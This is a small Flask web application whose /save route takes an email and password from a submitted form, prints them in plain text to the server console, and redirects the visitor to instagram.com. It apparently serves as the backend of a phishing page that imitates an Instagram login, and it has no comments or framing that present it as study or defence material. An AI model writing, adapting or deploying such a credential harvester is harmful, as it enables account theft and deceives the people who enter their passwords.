from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__, static_folder='./templates/images', static_url_path='/static')


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save', methods=['POST'])
def print_data():
    print("test1")
    email = request.form['email']
    password = request.form['password']
    print(f"Email: {email}, Password: {password}")
    return redirect('https://www.instagram.com')


if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))
